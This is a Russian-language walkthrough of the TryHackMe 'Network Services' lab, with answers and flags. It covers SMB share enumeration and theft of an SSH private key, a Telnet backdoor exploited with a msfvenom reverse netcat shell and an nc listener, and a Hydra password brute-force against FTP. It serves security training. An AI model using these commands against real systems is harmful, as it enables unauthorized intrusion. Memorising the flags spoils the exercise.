[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Network Services]() 

Всего 11 заданий:
## Задание 1
Привет и добро пожаловать!

В этом зале мы рассмотрим распространенные уязвимости и неправильные конфигурации сетевых служб, но для этого нам 
сначала нужно будет сделать несколько вещей! 

Для этой комнаты требуются базовые знания Linux и навигации по файловой системе Linux. Если вы считаете, что вам 
понадобится помощь, попробуйте пройти модуль «Основы Linux» (https://tryhackme.com/module/linux-fundamentals) 

Подключитесь к серверу TryHackMe OpenVPN (для получения помощи см. https://tryhackme.com/access !)
Устройтесь поудобнее и выпейте чашку чая, кофе или воды рядом!
А теперь пойдем дальше!

NB Это не комната о взломе или перехвате доступа к WiFi, а скорее о том, как получить несанкционированный доступ к 
машине, эксплуатируя сетевые службы. Если вас интересует взлом WiFi, я предлагаю ознакомиться с WiFi Hacking 101 от 
NinjaJc01 ( https://tryhackme.com/room/wifihacking101 )  

### Ответить на вопросы ниже
Готовы? Поехали!

```commandline
Ответ не нужен
```

## Задание 2
Что такое SMB ?

SMB (Server Message Block Protocol) — протокол клиент-серверной связи, используемый для совместного доступа к файлам,
принтерам, последовательным портам и другим ресурсам в сети. 

Серверы делают файловые системы и другие ресурсы (принтеры, именованные каналы, API) доступными для клиентов в сети. 
Клиентские компьютеры могут иметь собственные жесткие диски, но они также хотят иметь доступ к общим файловым 
системам и принтерам на серверах.  

Протокол SMB известен как протокол ответа-запроса, что означает, что он передает несколько сообщений между клиентом 
и сервером для установления соединения. Клиенты подключаются к серверам с помощью TCP /IP (фактически NetBIOS через 
TCP /IP, как указано в RFC1001 и RFC1002), NetBEUI или IPX/SPX.  

Как работает малый и средний бизнес ?


После того, как они установили соединение, клиенты могут отправлять команды (SMB) на сервер, которые позволяют им 
получать доступ к общим ресурсам, открывать файлы, читать и записывать файлы и вообще делать все, что вы хотите 
делать с файловой системой. Однако в случае SMB эти вещи делаются по сети.  

Что управляет малым и средним бизнесом ?

Операционные системы Microsoft Windows, начиная с Windows 95, включают поддержку клиентского и серверного протокола 
SMB. Samba, сервер с открытым исходным кодом, поддерживающий протокол SMB, был выпущен для систем Unix. 

### Ответить на вопросы ниже
Что означает аббревиатура SMB?    
```commandline
Server Message Block
```
Какой тип протокола представляет собой SMB?    
```commandline
response-request
```
С помощью чего клиенты подключаются к серверам?    
```commandline
TCP/IP
```
На каких системах работает Samba?
```commandline
Unix
```

## Задание 3
Давайте начнем

Прежде чем начать, обязательно разверните комнату и дайте ей время на загрузку. Имейте в виду, что это может занять 
до пяти минут, так что будьте терпеливы! 

### Перечисление

Перечисление — это процесс сбора информации о цели с целью выявления потенциальных векторов атак и содействия их 
эксплуатации. 

Этот процесс необходим для успешной атаки, поскольку трата времени на эксплойты, которые либо не работают, либо 
могут привести к сбою системы, может оказаться пустой тратой энергии. Перечисление может использоваться для сбора 
имен пользователей, паролей, сетевой информации, имен хостов, данных приложений, служб или любой другой информации, 
которая может быть ценной для злоумышленника.   

### МСБ

Обычно на сервере есть общие диски SMB, к которым можно подключиться и использовать их для просмотра или передачи 
файлов. SMB часто может быть отличной отправной точкой для злоумышленника, желающего обнаружить конфиденциальную 
информацию — вы будете удивлены, что иногда содержится в этих общих дисках.  

### Сканирование портов

Первым шагом перечисления является сканирование портов, чтобы получить как можно больше информации о службах, 
приложениях, структуре и операционной системе целевой машины. 

Если вы еще не рассматривали сканирование портов, рекомендую вам заглянуть в комнату Nmap здесь.

### Enum4Linux

Enum4linux — это инструмент, используемый для перечисления общих ресурсов SMB в системах Windows и Linux. По сути, 
это оболочка вокруг инструментов в пакете Samba, которая позволяет легко и быстро извлекать информацию из цели, 
относящуюся к SMB. Он уже установлен на AttackBox, однако, если вам нужно установить его на свою атакующую машину, 
вы можете сделать это с официального github.   

Синтаксис Enum4Linux прост и удобен: «enum4linux [опции] ip»

ФУНКЦИЯ ТЕГА

-U получить список пользователей
-M получить список машин
-N получить дамп списка имен (отличается от -U и -M)
-S получить список общих ресурсов
-P получить информацию о политике паролей
-G получить список групп и участников

-а все вышеперечисленное (полный базовый перечень)

Теперь, когда мы разобрались с нашими инструментами подсчета, давайте начнем!

### Ответить на вопросы ниже
Проведите сканирование nmap по вашему выбору. Сколько портов открыто?
```commandline
3
```
На каких портах работает SMB ?
```commandline
139/445
```
Давайте начнем с Enum4Linux, проведем полный базовый перебор. Для начала, как называется рабочая группа ?    
```commandline
WORKGROUP
```
Как называется эта машина?        
```commandline
POLOSMB
```
Какая версия операционной системы установлена?    
```commandline
6.1
```
Какая акция заслуживает особого внимания и заслуживает изучения?    
```commandline
profiles
```

## Задание 4
Типы уязвимостей SMB

Хотя существуют уязвимости, такие как CVE -2017-7494 , которые позволяют удаленное выполнение кода с использованием 
SMB, вы, скорее всего, столкнетесь с ситуацией, когда лучший способ проникнуть в систему — это неправильные 
настройки в системе. В этом случае мы будем использовать анонимный общий доступ SMB — распространенную неправильную 
настройку, которая может позволить нам получить информацию, которая приведет к оболочке.   

Метод разбивки

Итак, на этапе перечисления мы знаем:

    - Местоположение общего доступа SMB

    - Название интересной акции МСБ

### SMBКлиент

Поскольку мы пытаемся получить доступ к общему ресурсу SMB, нам нужен клиент для доступа к ресурсам на серверах. Мы 
будем использовать SMBClient, поскольку он является частью пакета samba по умолчанию. Хотя он уже установлен на 
AttackBox, если вам нужно установить его на своей атакующей машине, вы можете найти документацию здесь.  

Мы можем получить удаленный доступ к общему ресурсу SMB, используя следующий синтаксис:

smbclient //[IP]/[SHARE]

Далее следуют теги:

-U [имя]: указать пользователя

-p [порт]: указать порт

Понятно? Хорошо, давайте сделаем это!

### Ответить на вопросы ниже
Какой будет правильный синтаксис для доступа к общему ресурсу SMB с именем «secret» в качестве пользователя «suit» 
на компьютере с IP-адресом 10.10.10.2 на порту по умолчанию? 

```commandline
smbclient //10.10.10.2/secret -U suit -p 445
```
Отлично! Теперь вы разобрались с синтаксисом, давайте попробуем воспользоваться этой уязвимостью. У вас есть список 
пользователей, имя общего ресурса (smb) и предполагаемая уязвимость. 
```commandline
Ответ не нужен
```
Давайте посмотрим, настроен ли наш интересный ресурс на разрешение анонимного доступа, IE не требует аутентификации 
для просмотра файлов. Мы можем сделать это легко: 
- используя имя пользователя «Аноним»
- подключение к ресурсу, который мы нашли на этапе перечисления
- и не предоставляя пароль.

Разрешает ли эта акция анонимный доступ? Да/Нет?
```commandline
Y
```
Отлично! Осмотритесь вокруг на предмет интересных документов, которые могут содержать ценную информацию. Кому, как 
мы можем предположить, принадлежит эта папка профиля? 
```commandline
John Cactus
```
Какая служба была настроена, чтобы позволить ему работать из дома?
```commandline
ssh
```
Хорошо! Теперь, когда мы это знаем, в каком каталоге на общем ресурсе нам следует искать?
```commandline
.ssh
```
Этот каталог содержит ключи аутентификации, которые позволяют пользователю аутентифицировать себя на сервере, а 
затем получить к нему доступ. Какой из этих ключей наиболее полезен для нас? 
```commandline
id_rsa
```
Загрузите этот файл на свой локальный компьютер и измените права доступа на «600» с помощью «chmod 600 [файл]».

Теперь используйте информацию, которую вы уже собрали, чтобы определить имя пользователя учетной записи. Затем 
используйте сервис и ключ для входа на сервер. 

Что такое флаг smb.txt?
```commandline
THM{smb_is_fun_eh?}
```

## Задание 5
Что такое Telnet?

Telnet — это прикладной протокол, позволяющий с помощью клиента Telnet подключаться к удаленному компьютеру, на 
котором размещен сервер Telnet, и выполнять команды на нем. 

Клиент telnet установит соединение с сервером. Затем клиент станет виртуальным терминалом, что позволит вам 
взаимодействовать с удаленным хостом. 

### Замена

Telnet отправляет все сообщения в открытом виде и не имеет специальных механизмов безопасности. Таким образом, во 
многих приложениях и службах Telnet был заменен на SSH в большинстве реализаций. 
  
### Как работает Telnet?

Пользователь подключается к серверу с помощью протокола Telnet, что означает ввод "telnet" в командную строку. Затем 
пользователь выполняет команды на сервере, используя определенные команды Telnet в командной строке Telnet. Вы 
можете подключиться к серверу Telnet с помощью следующего синтаксиса: "telnet [ip] [port]"

### Ответить на вопросы ниже
Что такое Telnet?    
```commandline
application protocol
```
Что постепенно заменило Telnet?    
```commandline
ssh
```
Как подключиться к серверу Telnet с IP-адресом 10.10.10.3 на порту 23?
```commandline
telnet 10.10.10.3 23
```
Отсутствие чего означает, что все общение по Telnet происходит в открытом виде?
```commandline
encryption
```
## Задание 6
Давайте начнем

Прежде чем начать, обязательно разверните комнату и дайте ей время на загрузку. Имейте в виду, что это может занять 
до пяти минут, так что будьте терпеливы! 

Перечисление

Мы уже видели, насколько важным может быть перечисление при эксплуатации неправильно настроенной сетевой службы. 
Однако уязвимости, которые потенциально могут быть тривиальными для эксплуатации, не всегда бросаются в глаза. По 
этой причине, особенно когда дело касается перечисления сетевых служб, нам нужно быть тщательными в нашем методе.   

### Сканирование портов

Давайте начнем так же, как мы это обычно делаем, со сканирования портов, чтобы узнать как можно больше информации о 
службах, приложениях, структуре и операционной системе целевой машины. Просканируем машину с помощью nmap. 

Выход

Давайте посмотрим, что происходит на целевом сервере...


### Ответить на вопросы ниже
Сколько портов открыто на целевой машине?    
```commandline
1
```
Какой это порт ?
```commandline
8012
```
Этот порт не назначен, но по-прежнему указан используемый им      протокол . Что это за протокол?
```commandline
tcp
```
Теперь запустите сканирование nmap повторно , без тега -p- , сколько портов будет открыто?
```commandline
0
```
Здесь мы видим, что, назначая telnet нестандартному порту , он не входит в список общих портов или 1000 лучших 
портов, которые сканирует nmap. Важно попробовать каждый угол при перечислении, так как собранная вами здесь 
информация будет информировать вас о вашей стадии эксплуатации.  
```commandline
Ответ не нужен
```
Исходя из полученного нами названия, как мы думаем, для чего может использоваться этот порт ?

```commandline
a backdoor
```
Кому это может принадлежать? Сбор возможных имен пользователей — важный шаг в подсчете.

```commandline
Skidy
```
Всегда записывайте информацию, которую вы найдете на этапе перечисления, чтобы вы могли обратиться к ней, когда 
перейдете к проверке эксплойтов. 
```commandline
Ответ не нужен
```

## Задание 7
Типы эксплойтов Telnet

Telnet, будучи протоколом, сам по себе небезопасен по причинам, о которых мы говорили ранее. Он не имеет шифрования, 
поэтому отправляет все сообщения открытым текстом, и по большей части имеет слабый контроль доступа. Однако 
существуют CVE для клиентских и серверных систем Telnet, поэтому при эксплуатации вы можете проверить их на:  

https://www.cvedetails.com/
https://cve.mitre.org/
CVE, сокращение от Common Vulnerabilities and Exposures, представляет собой список публично раскрытых уязвимостей 
компьютерной безопасности. Когда кто-то ссылается на CVE, он обычно имеет в виду номер идентификатора CVE, 
присвоенный уязвимости безопасности.  

Однако гораздо более вероятно, что вы обнаружите неправильную конфигурацию или способ работы Telnet, что позволит 
вам воспользоваться уязвимостью. 

### Метод разбивки
Итак, на этапе перечисления мы знаем:
- На этом компьютере запущен плохо скрытый сервис Telnet.
- Сама услуга имеет пометку «бэкдор»
- У нас есть возможное имя пользователя «Skidy»

Используя эту информацию, давайте попробуем получить доступ к этому порту telnet и использовать его как точку опоры 
для получения полного обратного шелла на машине! 

Подключение к Telnet

Подключиться к серверу Telnet можно с помощью следующего синтаксиса:

    "telnet [ip] [порт]"

Нам придется помнить об этом, когда мы попытаемся использовать эту машину.

Что такое обратная оболочка?

« Оболочку » можно просто описать как фрагмент кода или программы, который можно использовать для получения кода или 
выполнения команды на устройстве. 

Обратный шелл — это тип шелл, при котором целевая машина обменивается данными с атакующей машиной.

Атакующая машина имеет прослушивающий порт, на который она получает соединение, в результате чего достигается 
выполнение кода или команды. 

### Ответить на вопросы ниже
Хорошо, давайте попробуем подключиться к этому порту telnet! Если вы застряли, посмотрите на синтаксис подключения, 
описанный выше. 
```commandline
Ответ не нужен
```
Отлично! Это открытое telnet-соединение! Какое приветственное сообщение мы получаем?
```commandline
SKIDY'S BACKDOOR.
```
Давайте попробуем выполнить несколько команд. Получим ли мы ответ на любой ввод, который введем в сеанс telnet? (Да/Нет)
```commandline
N
```
Хм... странно. Давайте проверим, выполняется ли то, что мы печатаем, как системная команда.
```commandline
Ответ не нужен
```
Запустите прослушиватель tcpdump на локальном компьютере.

Если вы используете собственную машину с подключением OpenVPN, используйте:

`sudo tcpdump ip proto \\icmp -i tun0`
При использовании AttackBox используйте:

`sudo tcpdump ip proto \\icmp -i ens5`
Это запускает прослушиватель tcpdump, который прослушивает трафик ICMP, на котором работают пинги.
```commandline
Ответ не нужен
```
Теперь используйте команду "ping [local THM ip] -c 1" через сеанс telnet, чтобы проверить, можем ли мы выполнять 
системные команды. Получаем ли мы какие-либо пинги? Обратите внимание, вам нужно предварить это .RUN (Y/N) 
```commandline
Y
```
Отлично! Это значит, что мы можем выполнять системные команды И что мы можем получить доступ к нашей локальной 
машине. Теперь давайте повеселимся! 
```commandline
Ответ не нужен
```
Мы собираемся сгенерировать обратную оболочку с помощью msfvenom. Это сгенерирует и закодирует для нас обратную 
оболочку netcat. Вот наш синтаксис: 

`msfvenom - p cmd / unix / reverse_netcat lhost =[локальный tun0 ip] lport = 4444 R`

- -p = полезная нагрузка
- lhost = IP-адрес нашего локального хоста (это IP-адрес вашего  компьютера)
- lport = порт для прослушивания (это порт на вашем компьютере)
- R = экспортировать полезную нагрузку в необработанном формате

С какого слова начинается сгенерированная полезная нагрузка?

```commandline
mkfifo
```
Отлично. Мы почти у цели. Теперь нам нужно только запустить прослушиватель netcat на локальной машине. Мы делаем это 
с помощью: 

`nc -lvp [прослушиваемый порт]`

Как будет выглядеть команда для порта прослушивания, выбранного нами в нашей полезной нагрузке?
```commandline
nc -lvp 4444
```
Отлично! Теперь, когда все запущено, нам нужно скопировать и вставить наш полезный груз msfvenom в сеанс telnet и 
запустить его как команду. Надеюсь, это даст нам оболочку на целевой машине! 
```commandline
Ответ не нужен
```
Успех! Каково содержимое flag.txt?
```commandline
THM{y0u_g0t_th3_t3ln3t_fl4g}
```

## Задание 8
### Что такое FTP ?

Протокол передачи файлов (FTP) — это, как следует из названия, протокол, используемый для удаленной передачи файлов 
по сети. Для этого он использует модель клиент-сервер и, как мы увидим позже, передает команды и данные очень 
эффективным способом.  

### Как работает FTP ?
Типичный сеанс FTP работает с использованием двух каналов:
- канал управления (иногда называемый каналом управления)
- канал данных.
Как следует из названия, командный канал используется для передачи команд, а также ответов на эти команды, тогда как 
канал данных используется для передачи данных. 

FTP работает с использованием клиент-серверного протокола. Клиент инициирует соединение с сервером, сервер проверяет 
предоставленные учетные данные для входа и затем открывает сеанс. 

Пока сеанс открыт, клиент может выполнять FTP -команды на сервере.

Активный против пассивного

FTP - сервер может поддерживать как активные, так и пассивные соединения, или оба варианта. 

В активном FTP- подключении клиент открывает порт и слушает. Сервер должен активно подключиться к нему. 
При пассивном FTP- подключении сервер открывает порт и прослушивает его (пассивно), а клиент подключается к нему. 
Такое разделение командной информации и данных на отдельные каналы является способом отправки команд на сервер без 
необходимости ожидания завершения текущей передачи данных. Если бы оба канала были связаны, вы могли бы вводить 
команды только между передачами данных, что было бы неэффективно ни для больших передач файлов, ни для медленных 
интернет-соединений.   
Подробнее:

Более подробную информацию о технической функции и реализации FTP можно найти на сайте Internet Engineering Task 
Force: https://www.ietf.org/rfc/rfc959.txt. IETF является одним из многих агентств по стандартизации, которые 
определяют и регулируют стандарты Интернета.

### Ответить на вопросы ниже
Какую модель связи использует FTP?
```commandline
client-server
```
Какой стандартный порт FTP?
```commandline
21
```
Сколько существует режимов FTP-подключения?    
```commandline
2
```

## Задание 9
Давайте начнем

Прежде чем начать, обязательно разверните комнату и дайте ей время на загрузку. Имейте в виду, что это может занять 
до пяти минут, так что будьте терпеливы! 

### Перечисление

Думаю, мне не нужно больше объяснять, почему перечисление является ключевым моментом при атаках на сетевые службы и 
протоколы. К настоящему моменту у вас должно быть достаточно опыта работы с nmap , чтобы эффективно сканировать 
порты. Если вы застряли с использованием какого-либо инструмента, вы всегда можете использовать "tool [-h / -help / 
--help]", чтобы узнать больше о его функциях и синтаксисе. Аналогично, страницы man чрезвычайно полезны для этой 
цели. К ним можно получить доступ с помощью "man [tool]" .    

### Метод
Мы собираемся использовать анонимный вход в FTP , чтобы посмотреть, к каким файлам мы можем получить доступ, и 
содержат ли они какую-либо информацию, которая может позволить нам запустить оболочку в системе. Это 
распространенный путь в испытаниях CTF, имитирующий реальную небрежную реализацию FTP- серверов.  

### Ресурсы

Поскольку мы собираемся войти на FTP-сервер, нам нужно убедиться, что в системе установлен FTP-клиент. Он должен 
быть установлен по умолчанию в большинстве операционных систем Linux, таких как Kali или Parrot OS. Вы можете 
проверить, есть ли он, введя "ftp" в консоль. Если вы увидите приглашение, которое гласит: "ftp>", то у вас в 
системе есть работающий FTP-клиент. Если нет, то для его установки достаточно просто использовать "sudo apt install ftp".   

### Альтернативные методы подсчета
Стоит отметить, что некоторые уязвимые версии in.ftpd и некоторые другие варианты FTP-серверов возвращают разные 
ответы на команду "cwd" для существующих и несуществующих домашних каталогов. Это может быть использовано, поскольку 
вы можете выполнять команды cwd до аутентификации, и если есть домашний каталог, то, скорее всего, есть и учетная 
запись пользователя, которая будет с ним связана. Хотя эта ошибка встречается в основном в устаревших системах, о 
ней стоит знать, как о способе использования FTP.    

Эта уязвимость задокументирована по адресу: https://www.exploit-db.com/exploits/20745 

Теперь, когда мы разобрались с нашим инструментарием, давайте сделаем это.                 

### Ответить на вопросы ниже
Запустите сканирование nmap по вашему выбору.

Сколько портов открыто на целевой машине? 

```commandline
2
```
На каком порту работает ftp?


```commandline
21
```
Какой вариант FTP на нем работает?  


```commandline
vsftpd
```
Отлично, теперь мы знаем, с каким типом FTP-сервера мы имеем дело, и можем проверить, можем ли мы войти на 
FTP-сервер анонимно. Мы можем сделать это, введя "ftp [IP]" в консоль и введя "anonymous" и не вводя пароль, когда 
будет предложено.  

Каково имя файла в анонимном FTP-каталоге?
```commandline
PUBLIC_NOTICE.txt
```
Как мы думаем, какое имя пользователя
может быть возможным?

```commandline
mike
```
Отлично! Теперь у нас есть данные о FTP-сервере и, что самое важное, возможное имя пользователя. Давайте посмотрим, 
что мы можем с этим сделать... 
```commandline
Ответ не нужен
```

## Задание 10
### Типы FTP- эксплойтов

Аналогично Telnet, при использовании FTP как командные, так и каналы данных не шифруются. Любые данные, отправляемые 
по этим каналам, могут быть перехвачены и прочитаны. 

При отправке данных с FTP в виде открытого текста, если произойдет атака типа «человек посередине», злоумышленник 
может раскрыть все, что было отправлено через этот протокол (например, пароли). Статья, написанная JSCape, 
демонстрирует и объясняет этот процесс с использованием ARP -отравления, чтобы обманом заставить жертву отправить 
конфиденциальную информацию злоумышленнику, а не законному источнику.   

Если взглянуть на FTP -сервер с точки зрения нашей машины, то мы можем воспользоваться слабыми или заданными по 
умолчанию конфигурациями паролей. 

### Метод разбивки
Итак, на этапе перечисления мы знаем:
- На этом компьютере запущен FTP -сервер.
- У нас есть возможное имя пользователя

Используя эту информацию, попробуем подобрать пароль FTP- сервера.

### Гидра

Hydra — это очень быстрый онлайн-инструмент для взлома паролей, который может выполнять быстрые атаки по словарю 
против более чем 50 протоколов, включая Telnet, RDP, SSH, FTP, HTTP, HTTPS, SMB, нескольких баз данных и многого 
другого. Hydra уже установлена на AttackBox, однако, если она вам нужна на вашей собственной атакующей машине, вы 
можете найти репозиторий GitHub здесь.   
Синтаксис команды, которую мы будем использовать для поиска паролей, следующий:

`hydra -t 4 -l dale -P /usr/share/wordlists/rockyou.txt -vV 10.10.10.6 ftp`
Давайте разберемся:

РАЗДЕЛ ФУНКЦИЯ

hydra Запускает инструмент hydra

- -t 4 Количество параллельных подключений на цель
- -l [пользователь] Указывает на пользователя, учетную запись которого вы пытаетесь взломать
- -P [путь к словарю] Указывает на файл, содержащий список возможных паролей
- -vV Устанавливает подробный режим на очень подробный, показывает комбинацию логин+пароль для каждой попытки
- [IP-адрес машины] IP-адрес целевой машины
- ftp / протокол Устанавливает протокол

Давайте взломаем несколько паролей!

### Ответить на вопросы ниже
Какой пароль у пользователя «mike»?

```commandline
password
```
Бинго! Теперь давайте подключимся к FTP-серверу как этот пользователь, используя "ftp [IP]" и введя учетные данные 
при появлении соответствующего запроса. 
```commandline
Ответ не нужен
```
Что такое ftp.txt?
```commandline
THM{y0u_g0t_th3_ftp_fl4g}
```
## Задание 11

```commandline
Ответ не нужен
```
[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)